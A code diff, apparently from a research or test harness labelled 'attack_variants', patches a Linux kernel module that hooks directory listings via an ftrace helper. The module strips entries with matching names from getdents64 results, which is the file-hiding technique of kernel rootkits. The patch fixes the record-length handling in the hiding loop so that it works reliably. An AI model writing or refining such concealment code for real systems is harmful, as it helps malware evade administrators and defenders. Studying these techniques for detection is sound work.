@@ -1,0 +1,47 @@
+--- original/common.inc
++++ fixed/common.inc
+@@ -24,7 +24,7 @@
+ #include <linux/uaccess.h>
+ #include <linux/vmalloc.h>
+ 
+-#include "../d7_controls_r2/ftrace_helper.h"
++#include "../../attack_variants/d7_controls_r2/ftrace_helper.h"
+ 
+ #if !defined(KICBA_D8_MODE) || KICBA_D8_MODE < 0 || KICBA_D8_MODE > 3
+ #error "KICBA_D8_MODE must be 0..3"
+@@ -131,6 +131,7 @@
+ 		size_t name_room;
+ 		size_t name_len;
+ 		bool matched;
++		unsigned short record_size;
+ 
+ 		entry = (struct linux_dirent64 *)(buffer + input_offset);
+ 		if (entry->d_reclen < header + 1 ||
+@@ -147,6 +148,7 @@
+ 			return result;
+ 		}
+ 
++		record_size = entry->d_reclen;
+ 		atomic64_inc(&records_seen);
+ 		matched = d8_name_matches(entry->d_name);
+ 		if (matched)
+@@ -156,15 +158,15 @@
+ 		if (matched) {
+ 			atomic64_inc(&records_removed);
+ 			atomic64_add(entry->d_reclen, &bytes_removed);
+-			input_offset += entry->d_reclen;
++			input_offset += record_size;
+ 			continue;
+ 		}
+ #endif
+ 
+ 		if (output_offset != input_offset)
+-			memmove(buffer + output_offset, entry, entry->d_reclen);
+-		output_offset += entry->d_reclen;
+-		input_offset += entry->d_reclen;
++			memmove(buffer + output_offset, entry, record_size);
++		output_offset += record_size;
++		input_offset += record_size;
+ 	}
+ 
+ #if KICBA_D8_MODE == 2 || KICBA_D8_MODE == 3
